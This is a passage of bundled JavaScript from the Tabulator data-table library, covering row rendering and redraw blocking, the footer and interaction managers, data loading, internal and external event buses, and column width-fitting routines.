        if (!this.redrawBlockRestoreConfig || this.redrawBlockRestoreConfig && (this.redrawBlockRestoreConfig.stage === stage && index < this.redrawBlockRestoreConfig.index || cascadeOrder.indexOf(stage) < cascadeOrder.indexOf(this.redrawBlockRestoreConfig.stage))) {
          this.redrawBlockRestoreConfig = {
            handler,
            skipStage,
            renderInPosition,
            stage,
            index
          };
        }
        return;
      } else {
        if (Helpers.elVisible(this.element)) {
          if (renderInPosition) {
            this.reRenderInPosition(this.refreshPipelines.bind(this, handler, stage, index, renderInPosition));
          } else {
            this.refreshPipelines(handler, stage, index, renderInPosition);
            if (!handler) {
              this.table.columnManager.renderer.renderColumns();
            }
            this.renderTable();
            if (table.options.layoutColumnsOnNewData) {
              this.table.columnManager.redraw(true);
            }
          }
        } else {
          this.refreshPipelines(handler, stage, index, renderInPosition);
        }
        this.dispatch("data-refreshed");
      }
    }
  }
  refreshPipelines(handler, stage, index, renderInPosition) {
    this.dispatch("data-refreshing");
    if (!handler || !this.activeRowsPipeline[0]) {
      this.activeRowsPipeline[0] = this.rows.slice(0);
    }
    switch (stage) {
      case "all":
      case "dataPipeline":
        for (let i2 = index; i2 < this.dataPipeline.length; i2++) {
          let result = this.dataPipeline[i2].handler(this.activeRowsPipeline[i2].slice(0));
          this.activeRowsPipeline[i2 + 1] = result || this.activeRowsPipeline[i2].slice(0);
        }
        this.setActiveRows(this.activeRowsPipeline[this.dataPipeline.length]);
      case "display":
        index = 0;
        this.resetDisplayRows();
      case "displayPipeline":
        for (let i2 = index; i2 < this.displayPipeline.length; i2++) {
          let result = this.displayPipeline[i2].handler((i2 ? this.getDisplayRows(i2 - 1) : this.activeRows).slice(0), renderInPosition);
          this.setDisplayRows(result || this.getDisplayRows(i2 - 1).slice(0), i2);
        }
      case "end":
        this.regenerateRowPositions();
    }
    if (this.getDisplayRows().length) {
      this._clearPlaceholder();
    }
  }
  //regenerate row positions
  regenerateRowPositions() {
    var rows2 = this.getDisplayRows();
    var index = 1;
    rows2.forEach((row) => {
      if (row.type === "row") {
        row.setPosition(index);
        index++;
      }
    });
  }
  setActiveRows(activeRows) {
    this.activeRows = this.activeRows = Object.assign([], activeRows);
    this.activeRowsCount = this.activeRows.length;
  }
  //reset display rows array
  resetDisplayRows() {
    this.displayRows = [];
    this.displayRows.push(this.activeRows.slice(0));
    this.displayRowsCount = this.displayRows[0].length;
  }
  //set display row pipeline data
  setDisplayRows(displayRows, index) {
    this.displayRows[index] = displayRows;
    if (index == this.displayRows.length - 1) {
      this.displayRowsCount = this.displayRows[this.displayRows.length - 1].length;
    }
  }
  getDisplayRows(index) {
    if (typeof index == "undefined") {
      return this.displayRows.length ? this.displayRows[this.displayRows.length - 1] : [];
    } else {
      return this.displayRows[index] || [];
    }
  }
  getVisibleRows(chain, viewable) {
    var rows2 = Object.assign([], this.renderer.visibleRows(!viewable));
    if (chain) {
      rows2 = this.chain("rows-visible", [viewable], rows2, rows2);
    }
    return rows2;
  }
  //repeat action across display rows
  displayRowIterator(callback) {
    this.activeRowsPipeline.forEach(callback);
    this.displayRows.forEach(callback);
    this.displayRowsCount = this.displayRows[this.displayRows.length - 1].length;
  }
  //return only actual rows (not group headers etc)
  getRows(type) {
    var rows2 = [];
    switch (type) {
      case "active":
        rows2 = this.activeRows;
        break;
      case "display":
        rows2 = this.table.rowManager.getDisplayRows();
        break;
      case "visible":
        rows2 = this.getVisibleRows(false, true);
        break;
      default:
        rows2 = this.chain("rows-retrieve", type, null, this.rows) || this.rows;
    }
    return rows2;
  }
  ///////////////// Table Rendering /////////////////
  //trigger rerender of table in current position
  reRenderInPosition(callback) {
    if (this.redrawBlock) {
      if (callback) {
        callback();
      } else {
        this.redrawBlockRenderInPosition = true;
      }
    } else {
      this.dispatchExternal("renderStarted");
      this.renderer.rerenderRows(callback);
      if (!this.fixedHeight) {
        this.adjustTableSize();
      }
      this.scrollBarCheck();
      this.dispatchExternal("renderComplete");
    }
  }
  scrollBarCheck() {
    var scrollbarWidth = 0;
    if (this.element.scrollHeight > this.element.clientHeight) {
      scrollbarWidth = this.element.offsetWidth - this.element.clientWidth;
    }
    if (scrollbarWidth !== this.scrollbarWidth) {
      this.scrollbarWidth = scrollbarWidth;
      this.dispatch("scrollbar-vertical", scrollbarWidth);
    }
  }
  initializeRenderer() {
    var renderClass;
    var renderers = {
      "virtual": VirtualDomVertical,
      "basic": BasicVertical
    };
    if (typeof this.table.options.renderVertical === "string") {
      renderClass = renderers[this.table.options.renderVertical];
    } else {
      renderClass = this.table.options.renderVertical;
    }
    if (renderClass) {
      this.renderMode = this.table.options.renderVertical;
      this.renderer = new renderClass(this.table, this.element, this.tableElement);
      this.renderer.initialize();
      if ((this.table.element.clientHeight || this.table.options.height) && !(this.table.options.minHeight && this.table.options.maxHeight)) {
        this.fixedHeight = true;
      } else {
        this.fixedHeight = false;
      }
    } else {
      console.error("Unable to find matching renderer:", this.table.options.renderVertical);
    }
  }
  getRenderMode() {
    return this.renderMode;
  }
  renderTable() {
    this.dispatchExternal("renderStarted");
    this.element.scrollTop = 0;
    this._clearTable();
    if (this.displayRowsCount) {
      this.renderer.renderRows();
      if (this.firstRender) {
        this.firstRender = false;
        if (!this.fixedHeight) {
          this.adjustTableSize();
        }
        this.layoutRefresh(true);
      }
    } else {
      this.renderEmptyScroll();
    }
    if (!this.fixedHeight) {
      this.adjustTableSize();
    }
    this.dispatch("table-layout");
    if (!this.displayRowsCount) {
      this._showPlaceholder();
    }
    this.scrollBarCheck();
    this.dispatchExternal("renderComplete");
  }
  //show scrollbars on empty table div
  renderEmptyScroll() {
    if (this.placeholder) {
      this.tableElement.style.display = "none";
    } else {
      this.tableElement.style.minWidth = this.table.columnManager.getWidth() + "px";
    }
  }
  _clearTable() {
    this._clearPlaceholder();
    this.scrollTop = 0;
    this.scrollLeft = 0;
    this.renderer.clearRows();
  }
  tableEmpty() {
    this.renderEmptyScroll();
    this._showPlaceholder();
  }
  checkPlaceholder() {
    if (this.displayRowsCount) {
      this._clearPlaceholder();
    } else {
      this.tableEmpty();
    }
  }
  _showPlaceholder() {
    if (this.placeholder) {
      if (this.placeholder && this.placeholder.parentNode) {
        this.placeholder.parentNode.removeChild(this.placeholder);
      }
      this.initializePlaceholder();
      this.placeholder.setAttribute("tabulator-render-mode", this.renderMode);
      this.getElement().appendChild(this.placeholder);
      this._positionPlaceholder();
      this.adjustTableSize();
    }
  }
  _clearPlaceholder() {
    if (this.placeholder && this.placeholder.parentNode) {
      this.placeholder.parentNode.removeChild(this.placeholder);
    }
    this.tableElement.style.minWidth = "";
    this.tableElement.style.display = "";
  }
  _positionPlaceholder() {
    if (this.placeholder && this.placeholder.parentNode) {
      this.placeholder.style.width = this.table.columnManager.getWidth() + "px";
      this.placeholderContents.style.width = this.table.rowManager.element.clientWidth + "px";
      this.placeholderContents.style.marginLeft = this.scrollLeft + "px";
    }
  }
  styleRow(row, index) {
    var rowEl = row.getElement();
    if (index % 2) {
      rowEl.classList.add("tabulator-row-even");
      rowEl.classList.remove("tabulator-row-odd");
    } else {
      rowEl.classList.add("tabulator-row-odd");
      rowEl.classList.remove("tabulator-row-even");
    }
  }
  //normalize height of active rows
  normalizeHeight(force) {
    this.activeRows.forEach(function(row) {
      row.normalizeHeight(force);
    });
  }
  //adjust the height of the table holder to fit in the Tabulator element
  adjustTableSize() {
    let initialHeight = this.element.clientHeight, minHeight;
    let resized = false;
    if (this.renderer.verticalFillMode === "fill") {
      let otherHeight = Math.floor(this.table.columnManager.getElement().getBoundingClientRect().height + (this.table.footerManager && this.table.footerManager.active && !this.table.footerManager.external ? this.table.footerManager.getElement().getBoundingClientRect().height : 0));
      if (this.fixedHeight) {
        minHeight = isNaN(this.table.options.minHeight) ? this.table.options.minHeight : this.table.options.minHeight + "px";
        const height = "calc(100% - " + otherHeight + "px)";
        this.element.style.minHeight = minHeight || "calc(100% - " + otherHeight + "px)";
        this.element.style.height = height;
        this.element.style.maxHeight = height;
      } else {
        this.element.style.height = "";
        this.element.style.height = this.table.element.clientHeight - otherHeight + "px";
        this.element.scrollTop = this.scrollTop;
      }
      this.renderer.resize();
      if (!this.fixedHeight && initialHeight != this.element.clientHeight) {
        resized = true;
        if (this.subscribed("table-resize")) {
          this.dispatch("table-resize");
        } else {
          this.redraw();
        }
      }
      this.scrollBarCheck();
    }
    this._positionPlaceholder();
    return resized;
  }
  //reinitialize all rows
  reinitialize() {
    this.rows.forEach(function(row) {
      row.reinitialize(true);
    });
  }
  //prevent table from being redrawn
  blockRedraw() {
    this.redrawBlock = true;
    this.redrawBlockRestoreConfig = false;
  }
  //restore table redrawing
  restoreRedraw() {
    this.redrawBlock = false;
    if (this.redrawBlockRestoreConfig) {
      this.refreshActiveData(this.redrawBlockRestoreConfig.handler, this.redrawBlockRestoreConfig.skipStage, this.redrawBlockRestoreConfig.renderInPosition);
      this.redrawBlockRestoreConfig = false;
    } else {
      if (this.redrawBlockRenderInPosition) {
        this.reRenderInPosition();
      }
    }
    this.redrawBlockRenderInPosition = false;
  }
  //redraw table
  redraw(force) {
    this.adjustTableSize();
    this.table.tableWidth = this.table.element.clientWidth;
    if (!force) {
      this.reRenderInPosition();
      this.scrollHorizontal(this.scrollLeft);
    } else {
      this.renderTable();
    }
  }
  resetScroll() {
    this.element.scrollLeft = 0;
    this.element.scrollTop = 0;
    if (this.table.browser === "ie") {
      var event = document.createEvent("Event");
      event.initEvent("scroll", false, true);
      this.element.dispatchEvent(event);
    } else {
      this.element.dispatchEvent(new Event("scroll"));
    }
  }
}
class FooterManager extends CoreFeature {
  constructor(table) {
    super(table);
    this.active = false;
    this.element = this.createElement();
    this.containerElement = this.createContainerElement();
    this.external = false;
  }
  initialize() {
    this.initializeElement();
  }
  createElement() {
    var el = document.createElement("div");
    el.classList.add("tabulator-footer");
    return el;
  }
  createContainerElement() {
    var el = document.createElement("div");
    el.classList.add("tabulator-footer-contents");
    this.element.appendChild(el);
    return el;
  }
  initializeElement() {
    if (this.table.options.footerElement) {
      switch (typeof this.table.options.footerElement) {
        case "string":
          if (this.table.options.footerElement[0] === "<") {
            this.containerElement.innerHTML = this.table.options.footerElement;
          } else {
            this.external = true;
            this.containerElement = document.querySelector(this.table.options.footerElement);
          }
          break;
        default:
          this.element = this.table.options.footerElement;
          break;
      }
    }
  }
  getElement() {
    return this.element;
  }
  append(element) {
    this.activate();
    this.containerElement.appendChild(element);
    this.table.rowManager.adjustTableSize();
  }
  prepend(element) {
    this.activate();
    this.element.insertBefore(element, this.element.firstChild);
    this.table.rowManager.adjustTableSize();
  }
  remove(element) {
    element.parentNode.removeChild(element);
    this.deactivate();
  }
  deactivate(force) {
    if (!this.element.firstChild || force) {
      if (!this.external) {
        this.element.parentNode.removeChild(this.element);
      }
      this.active = false;
    }
  }
  activate() {
    if (!this.active) {
      this.active = true;
      if (!this.external) {
        this.table.element.appendChild(this.getElement());
        this.table.element.style.display = "";
      }
    }
  }
  redraw() {
    this.dispatch("footer-redraw");
  }
}
class InteractionManager extends CoreFeature {
  constructor(table) {
    super(table);
    this.el = null;
    this.abortClasses = ["tabulator-headers", "tabulator-table"];
    this.previousTargets = {};
    this.listeners = [
      "click",
      "dblclick",
      "contextmenu",
      "mouseenter",
      "mouseleave",
      "mouseover",
      "mouseout",
      "mousemove",
      "mouseup",
      "mousedown",
      "touchstart",
      "touchend"
    ];
    this.componentMap = {
      "tabulator-cell": "cell",
      "tabulator-row": "row",
      "tabulator-group": "group",
      "tabulator-col": "column"
    };
    this.pseudoTrackers = {
      "row": {
        subscriber: null,
        target: null
      },
      "cell": {
        subscriber: null,
        target: null
      },
      "group": {
        subscriber: null,
        target: null
      },
      "column": {
        subscriber: null,
        target: null
      }
    };
    this.pseudoTracking = false;
  }
  initialize() {
    this.el = this.table.element;
    this.buildListenerMap();
    this.bindSubscriptionWatchers();
  }
  buildListenerMap() {
    var listenerMap = {};
    this.listeners.forEach((listener) => {
      listenerMap[listener] = {
        handler: null,
        components: []
      };
    });
    this.listeners = listenerMap;
  }
  bindPseudoEvents() {
    Object.keys(this.pseudoTrackers).forEach((key) => {
      this.pseudoTrackers[key].subscriber = this.pseudoMouseEnter.bind(this, key);
      this.subscribe(key + "-mouseover", this.pseudoTrackers[key].subscriber);
    });
    this.pseudoTracking = true;
  }
  pseudoMouseEnter(key, e2, target) {
    if (this.pseudoTrackers[key].target !== target) {
      if (this.pseudoTrackers[key].target) {
        this.dispatch(key + "-mouseleave", e2, this.pseudoTrackers[key].target);
      }
      this.pseudoMouseLeave(key, e2);
      this.pseudoTrackers[key].target = target;
      this.dispatch(key + "-mouseenter", e2, target);
    }
  }
  pseudoMouseLeave(key, e2) {
    var leaveList = Object.keys(this.pseudoTrackers), linkedKeys = {
      "row": ["cell"],
      "cell": ["row"]
    };
    leaveList = leaveList.filter((item) => {
      var links = linkedKeys[key];
      return item !== key && (!links || links && !links.includes(item));
    });
    leaveList.forEach((key2) => {
      var target = this.pseudoTrackers[key2].target;
      if (this.pseudoTrackers[key2].target) {
        this.dispatch(key2 + "-mouseleave", e2, target);
        this.pseudoTrackers[key2].target = null;
      }
    });
  }
  bindSubscriptionWatchers() {
    var listeners = Object.keys(this.listeners), components = Object.values(this.componentMap);
    for (let comp of components) {
      for (let listener of listeners) {
        let key = comp + "-" + listener;
        this.subscriptionChange(key, this.subscriptionChanged.bind(this, comp, listener));
      }
    }
    this.subscribe("table-destroy", this.clearWatchers.bind(this));
  }
  subscriptionChanged(component, key, added) {
    var listener = this.listeners[key].components, index = listener.indexOf(component), changed = false;
    if (added) {
      if (index === -1) {
        listener.push(component);
        changed = true;
      }
    } else {
      if (!this.subscribed(component + "-" + key)) {
        if (index > -1) {
          listener.splice(index, 1);
          changed = true;
        }
      }
    }
    if ((key === "mouseenter" || key === "mouseleave") && !this.pseudoTracking) {
      this.bindPseudoEvents();
    }
    if (changed) {
      this.updateEventListeners();
    }
  }
  updateEventListeners() {
    for (let key in this.listeners) {
      let listener = this.listeners[key];
      if (listener.components.length) {
        if (!listener.handler) {
          listener.handler = this.track.bind(this, key);
          this.el.addEventListener(key, listener.handler);
        }
      } else {
        if (listener.handler) {
          this.el.removeEventListener(key, listener.handler);
          listener.handler = null;
        }
      }
    }
  }
  track(type, e2) {
    var path = e2.composedPath && e2.composedPath() || e2.path;
    var targets = this.findTargets(path);
    targets = this.bindComponents(type, targets);
    this.triggerEvents(type, e2, targets);
    if (this.pseudoTracking && (type == "mouseover" || type == "mouseleave") && !Object.keys(targets).length) {
      this.pseudoMouseLeave("none", e2);
    }
  }
  findTargets(path) {
    var targets = {};
    let componentMap = Object.keys(this.componentMap);
    for (let el of path) {
      let classList = el.classList ? [...el.classList] : [];
      let abort = classList.filter((item) => {
        return this.abortClasses.includes(item);
      });
      if (abort.length) {
        break;
      }
      let elTargets = classList.filter((item) => {
        return componentMap.includes(item);
      });
      for (let target of elTargets) {
        if (!targets[this.componentMap[target]]) {
          targets[this.componentMap[target]] = el;
        }
      }
    }
    if (targets.group && targets.group === targets.row) {
      delete targets.row;
    }
    return targets;
  }
  bindComponents(type, targets) {
    var keys = Object.keys(targets).reverse(), listener = this.listeners[type], matches = {}, targetMatches = {};
    for (let key of keys) {
      let component, target = targets[key], previousTarget = this.previousTargets[key];
      if (previousTarget && previousTarget.target === target) {
        component = previousTarget.component;
      } else {
        switch (key) {
          case "row":
          case "group":
            if (listener.components.includes("row") || listener.components.includes("cell") || listener.components.includes("group")) {
              let rows2 = this.table.rowManager.getVisibleRows(true);
              component = rows2.find((row) => {
                return row.getElement() === target;
              });
              if (targets["row"] && targets["row"].parentNode && targets["row"].parentNode.closest(".tabulator-row")) {
                targets[key] = false;
              }
            }
            break;
          case "column":
            if (listener.components.includes("column")) {
              component = this.table.columnManager.findColumn(target);
            }
            break;
          case "cell":
            if (listener.components.includes("cell")) {
              if (matches["row"] instanceof Row) {
                component = matches["row"].findCell(target);
              } else {
                if (targets["row"]) {
                  console.warn("Event Target Lookup Error - The row this cell is attached to cannot be found, has the table been reinitialized without being destroyed first?");
                }
              }
            }
            break;
        }
      }
      if (component) {
        matches[key] = component;
        targetMatches[key] = {
          target,
          component
        };
      }
    }
    this.previousTargets = targetMatches;
    return matches;
  }
  triggerEvents(type, e2, targets) {
    var listener = this.listeners[type];
    for (let key in targets) {
      if (targets[key] && listener.components.includes(key)) {
        this.dispatch(key + "-" + type, e2, targets[key]);
      }
    }
  }
  clearWatchers() {
    for (let key in this.listeners) {
      let listener = this.listeners[key];
      if (listener.handler) {
        this.el.removeEventListener(key, listener.handler);
        listener.handler = null;
      }
    }
  }
}
class ComponentFunctionBinder {
  constructor(table) {
    this.table = table;
    this.bindings = {};
  }
  bind(type, funcName, handler) {
    if (!this.bindings[type]) {
      this.bindings[type] = {};
    }
    if (this.bindings[type][funcName]) {
      console.warn("Unable to bind component handler, a matching function name is already bound", type, funcName, handler);
    } else {
      this.bindings[type][funcName] = handler;
    }
  }
  handle(type, component, name) {
    if (this.bindings[type] && this.bindings[type][name] && typeof this.bindings[type][name].bind === "function") {
      return this.bindings[type][name].bind(null, component);
    } else {
      if (name !== "then" && typeof name === "string" && !name.startsWith("_")) {
        if (this.table.options.debugInvalidComponentFuncs) {
          console.error("The " + type + " component does not have a " + name + " function, have you checked that you have the correct Tabulator module installed?");
        }
      }
    }
  }
}
class DataLoader extends CoreFeature {
  constructor(table) {
    super(table);
    this.requestOrder = 0;
    this.loading = false;
  }
  initialize() {
  }
  load(data, params, config, replace2, silent, columnsChanged) {
    var requestNo = ++this.requestOrder;
    if (this.table.destroyed) {
      return Promise.resolve();
    }
    this.dispatchExternal("dataLoading", data);
    if (data && (data.indexOf("{") == 0 || data.indexOf("[") == 0)) {
      data = JSON.parse(data);
    }
    if (this.confirm("data-loading", [data, params, config, silent])) {
      this.loading = true;
      if (!silent) {
        this.alertLoader();
      }
      params = this.chain("data-params", [data, config, silent], params || {}, params || {});
      params = this.mapParams(params, this.table.options.dataSendParams);
      var result = this.chain("data-load", [data, params, config, silent], false, Promise.resolve([]));
      return result.then((response) => {
        if (!this.table.destroyed) {
          if (!Array.isArray(response) && typeof response == "object") {
            response = this.mapParams(response, this.objectInvert(this.table.options.dataReceiveParams));
          }
          var rowData = this.chain("data-loaded", [response], null, response);
          if (requestNo == this.requestOrder) {
            this.clearAlert();
            if (rowData !== false) {
              this.dispatchExternal("dataLoaded", rowData);
              this.table.rowManager.setData(rowData, replace2, typeof columnsChanged === "undefined" ? !replace2 : columnsChanged);
            }
          } else {
            console.warn("Data Load Response Blocked - An active data load request was blocked by an attempt to change table data while the request was being made");
          }
        } else {
          console.warn("Data Load Response Blocked - Table has been destroyed");
        }
      }).catch((error2) => {
        console.error("Data Load Error: ", error2);
        this.dispatchExternal("dataLoadError", error2);
        if (!silent) {
          this.alertError();
        }
        setTimeout(() => {
          this.clearAlert();
        }, this.table.options.dataLoaderErrorTimeout);
      }).finally(() => {
        this.loading = false;
      });
    } else {
      this.dispatchExternal("dataLoaded", data);
      if (!data) {
        data = [];
      }
      this.table.rowManager.setData(data, replace2, typeof columnsChanged === "undefined" ? !replace2 : columnsChanged);
      return Promise.resolve();
    }
  }
  mapParams(params, map) {
    var output = {};
    for (let key in params) {
      output[map.hasOwnProperty(key) ? map[key] : key] = params[key];
    }
    return output;
  }
  objectInvert(obj) {
    var output = {};
    for (let key in obj) {
      output[obj[key]] = key;
    }
    return output;
  }
  blockActiveLoad() {
    this.requestOrder++;
  }
  alertLoader() {
    var shouldLoad = typeof this.table.options.dataLoader === "function" ? this.table.options.dataLoader() : this.table.options.dataLoader;
    if (shouldLoad) {
      this.table.alertManager.alert(this.table.options.dataLoaderLoading || this.langText("data|loading"));
    }
  }
  alertError() {
    this.table.alertManager.alert(this.table.options.dataLoaderError || this.langText("data|error"), "error");
  }
  clearAlert() {
    this.table.alertManager.clear();
  }
}
class ExternalEventBus {
  constructor(table, optionsList, debug) {
    this.table = table;
    this.events = {};
    this.optionsList = optionsList || {};
    this.subscriptionNotifiers = {};
    this.dispatch = debug ? this._debugDispatch.bind(this) : this._dispatch.bind(this);
    this.debug = debug;
  }
  subscriptionChange(key, callback) {
    if (!this.subscriptionNotifiers[key]) {
      this.subscriptionNotifiers[key] = [];
    }
    this.subscriptionNotifiers[key].push(callback);
    if (this.subscribed(key)) {
      this._notifySubscriptionChange(key, true);
    }
  }
  subscribe(key, callback) {
    if (!this.events[key]) {
      this.events[key] = [];
    }
    this.events[key].push(callback);
    this._notifySubscriptionChange(key, true);
  }
  unsubscribe(key, callback) {
    var index;
    if (this.events[key]) {
      if (callback) {
        index = this.events[key].findIndex((item) => {
          return item === callback;
        });
        if (index > -1) {
          this.events[key].splice(index, 1);
        } else {
          console.warn("Cannot remove event, no matching event found:", key, callback);
          return;
        }
      } else {
        delete this.events[key];
      }
    } else {
      console.warn("Cannot remove event, no events set on:", key);
      return;
    }
    this._notifySubscriptionChange(key, false);
  }
  subscribed(key) {
    return this.events[key] && this.events[key].length;
  }
  _notifySubscriptionChange(key, subscribed) {
    var notifiers = this.subscriptionNotifiers[key];
    if (notifiers) {
      notifiers.forEach((callback) => {
        callback(subscribed);
      });
    }
  }
  _dispatch() {
    var args = Array.from(arguments), key = args.shift(), result;
    if (this.events[key]) {
      this.events[key].forEach((callback, i2) => {
        let callResult = callback.apply(this.table, args);
        if (!i2) {
          result = callResult;
        }
      });
    }
    return result;
  }
  _debugDispatch() {
    var args = Array.from(arguments), key = args[0];
    args[0] = "ExternalEvent:" + args[0];
    if (this.debug === true || this.debug.includes(key)) {
      console.log(...args);
    }
    return this._dispatch(...arguments);
  }
}
class InternalEventBus {
  constructor(debug) {
    this.events = {};
    this.subscriptionNotifiers = {};
    this.dispatch = debug ? this._debugDispatch.bind(this) : this._dispatch.bind(this);
    this.chain = debug ? this._debugChain.bind(this) : this._chain.bind(this);
    this.confirm = debug ? this._debugConfirm.bind(this) : this._confirm.bind(this);
    this.debug = debug;
  }
  subscriptionChange(key, callback) {
    if (!this.subscriptionNotifiers[key]) {
      this.subscriptionNotifiers[key] = [];
    }
    this.subscriptionNotifiers[key].push(callback);
    if (this.subscribed(key)) {
      this._notifySubscriptionChange(key, true);
    }
  }
  subscribe(key, callback, priority = 1e4) {
    if (!this.events[key]) {
      this.events[key] = [];
    }
    this.events[key].push({ callback, priority });
    this.events[key].sort((a, b) => {
      return a.priority - b.priority;
    });
    this._notifySubscriptionChange(key, true);
  }
  unsubscribe(key, callback) {
    var index;
    if (this.events[key]) {
      if (callback) {
        index = this.events[key].findIndex((item) => {
          return item.callback === callback;
        });
        if (index > -1) {
          this.events[key].splice(index, 1);
        } else {
          console.warn("Cannot remove event, no matching event found:", key, callback);
          return;
        }
      }
    } else {
      console.warn("Cannot remove event, no events set on:", key);
      return;
    }
    this._notifySubscriptionChange(key, false);
  }
  subscribed(key) {
    return this.events[key] && this.events[key].length;
  }
  _chain(key, args, initialValue, fallback) {
    var value = initialValue;
    if (!Array.isArray(args)) {
      args = [args];
    }
    if (this.subscribed(key)) {
      this.events[key].forEach((subscriber, i2) => {
        value = subscriber.callback.apply(this, args.concat([value]));
      });
      return value;
    } else {
      return typeof fallback === "function" ? fallback() : fallback;
    }
  }
  _confirm(key, args) {
    var confirmed = false;
    if (!Array.isArray(args)) {
      args = [args];
    }
    if (this.subscribed(key)) {
      this.events[key].forEach((subscriber, i2) => {
        if (subscriber.callback.apply(this, args)) {
          confirmed = true;
        }
      });
    }
    return confirmed;
  }
  _notifySubscriptionChange(key, subscribed) {
    var notifiers = this.subscriptionNotifiers[key];
    if (notifiers) {
      notifiers.forEach((callback) => {
        callback(subscribed);
      });
    }
  }
  _dispatch() {
    var args = Array.from(arguments), key = args.shift();
    if (this.events[key]) {
      this.events[key].forEach((subscriber) => {
        subscriber.callback.apply(this, args);
      });
    }
  }
  _debugDispatch() {
    var args = Array.from(arguments), key = args[0];
    args[0] = "InternalEvent:" + key;
    if (this.debug === true || this.debug.includes(key)) {
      console.log(...args);
    }
    return this._dispatch(...arguments);
  }
  _debugChain() {
    var args = Array.from(arguments), key = args[0];
    args[0] = "InternalEvent:" + key;
    if (this.debug === true || this.debug.includes(key)) {
      console.log(...args);
    }
    return this._chain(...arguments);
  }
  _debugConfirm() {
    var args = Array.from(arguments), key = args[0];
    args[0] = "InternalEvent:" + key;
    if (this.debug === true || this.debug.includes(key)) {
      console.log(...args);
    }
    return this._confirm(...arguments);
  }
}
class DeprecationAdvisor extends CoreFeature {
  constructor(table) {
    super(table);
  }
  _warnUser() {
    if (this.options("debugDeprecation")) {
      console.warn(...arguments);
    }
  }
  check(oldOption, newOption, convert) {
    var msg = "";
    if (typeof this.options(oldOption) !== "undefined") {
      msg = "Deprecated Setup Option - Use of the %c" + oldOption + "%c option is now deprecated";
      if (newOption) {
        msg = msg + ", Please use the %c" + newOption + "%c option instead";
        this._warnUser(msg, "font-weight: bold;", "font-weight: normal;", "font-weight: bold;", "font-weight: normal;");
        if (convert) {
          this.table.options[newOption] = this.table.options[oldOption];
        }
      } else {
        this._warnUser(msg, "font-weight: bold;", "font-weight: normal;");
      }
      return false;
    } else {
      return true;
    }
  }
  checkMsg(oldOption, msg) {
    if (typeof this.options(oldOption) !== "undefined") {
      this._warnUser("%cDeprecated Setup Option - Use of the %c" + oldOption + " %c option is now deprecated, " + msg, "font-weight: normal;", "font-weight: bold;", "font-weight: normal;");
      return false;
    } else {
      return true;
    }
  }
  msg(msg) {
    this._warnUser(msg);
  }
}
class DependencyRegistry extends CoreFeature {
  constructor(table) {
    super(table);
    this.deps = {};
    this.props = {};
  }
  initialize() {
    this.deps = Object.assign({}, this.options("dependencies"));
  }
  lookup(key, prop, silent) {
    if (Array.isArray(key)) {
      for (const item of key) {
        var match2 = this.lookup(item, prop, true);
        if (match2) {
          break;
        }
      }
      if (match2) {
        return match2;
      } else {
        this.error(key);
      }
    } else {
      if (prop) {
        return this.lookupProp(key, prop, silent);
      } else {
        return this.lookupKey(key, silent);
      }
    }
  }
  lookupProp(key, prop, silent) {
    var dependency;
    if (this.props[key] && this.props[key][prop]) {
      return this.props[key][prop];
    } else {
      dependency = this.lookupKey(key, silent);
      if (dependency) {
        if (!this.props[key]) {
          this.props[key] = {};
        }
        this.props[key][prop] = dependency[prop] || dependency;
        return this.props[key][prop];
      }
    }
  }
  lookupKey(key, silent) {
    var dependency;
    if (this.deps[key]) {
      dependency = this.deps[key];
    } else if (window[key]) {
      this.deps[key] = window[key];
      dependency = this.deps[key];
    } else {
      if (!silent) {
        this.error(key);
      }
    }
    return dependency;
  }
  error(key) {
    console.error("Unable to find dependency", key, "Please check documentation and ensure you have imported the required library into your project");
  }
}
function fitData(columns, forced) {
  if (forced) {
    this.table.columnManager.renderer.reinitializeColumnWidths(columns);
  }
  if (this.table.options.responsiveLayout && this.table.modExists("responsiveLayout", true)) {
    this.table.modules.responsiveLayout.update();
  }
}
function fitDataGeneral(columns, forced) {
  columns.forEach(function(column) {
    column.reinitializeWidth();
  });
  if (this.table.options.responsiveLayout && this.table.modExists("responsiveLayout", true)) {
    this.table.modules.responsiveLayout.update();
  }
}
function fitDataStretch(columns, forced) {
  var colsWidth = 0, tableWidth = this.table.rowManager.element.clientWidth, gap = 0, lastCol = false;
  columns.forEach((column, i2) => {
    if (!column.widthFixed) {
      column.reinitializeWidth();
    }
    if (this.table.options.responsiveLayout ? column.modules.responsive.visible : column.visible) {
      lastCol = column;
    }
    if (column.visible) {
      colsWidth += column.getWidth();
    }
  });
  if (lastCol) {
    gap = tableWidth - colsWidth + lastCol.getWidth();
    if (this.table.options.responsiveLayout && this.table.modExists("responsiveLayout", true)) {
      lastCol.setWidth(0);
      this.table.modules.responsiveLayout.update();
    }
    if (gap > 0) {
      lastCol.setWidth(gap);
    } else {
      lastCol.reinitializeWidth();
    }
  } else {
    if (this.table.options.responsiveLayout && this.table.modExists("responsiveLayout", true)) {
      this.table.modules.responsiveLayout.update();
    }
  }
}
function fitColumns(columns, forced) {
  var totalWidth = this.table.rowManager.element.getBoundingClientRect().width;
  var fixedWidth = 0;
  var flexWidth = 0;
  var flexGrowUnits = 0;
  var flexColWidth = 0;
  var flexColumns = [];
  var fixedShrinkColumns = [];
  var flexShrinkUnits = 0;
  var overflowWidth = 0;
  var gapFill = 0;
  function calcWidth(width) {
    var colWidth;
    if (typeof width == "string") {
      if (width.indexOf("%") > -1) {
        colWidth = totalWidth / 100 * parseInt(width);
      } else {
        colWidth = parseInt(width);
      }
    } else {
      colWidth = width;
    }
    return colWidth;
  }
  function scaleColumns(columns2, freeSpace, colWidth, shrinkCols) {
    var oversizeCols = [], oversizeSpace = 0, remainingSpace = 0, nextColWidth = 0, remainingFlexGrowUnits = flexGrowUnits, gap = 0, changeUnits = 0, undersizeCols = [];
    function calcGrow(col) {
      return colWidth * (col.column.definition.widthGrow || 1);
    }
    function calcShrink(col) {
      return calcWidth(col.width) - colWidth * (col.column.definition.widthShrink || 0);
    }
    columns2.forEach(function(col, i2) {
      var width = shrinkCols ? calcShrink(col) : calcGrow(col);
      if (col.column.minWidth >= width) {
        oversizeCols.push(col);
      } else {
        if (col.column.maxWidth && col.column.maxWidth < width) {
          col.width = col.column.maxWidth;
          freeSpace -= col.column.maxWidth;
          remainingFlexGrowUnits -= shrinkCols ? col.column.definition.widthShrink || 1 : col.column.definition.widthGrow || 1;
          if (remainingFlexGrowUnits) {
            colWidth = Math.floor(freeSpace / remainingFlexGrowUnits);
          }
        } else {
          undersizeCols.push(col);
          changeUnits += shrinkCols ? col.column.definition.widthShrink || 1 : col.column.definition.widthGrow || 1;
        }
      }
    });
    if (oversizeCols.length) {
      oversizeCols.forEach(function(col) {
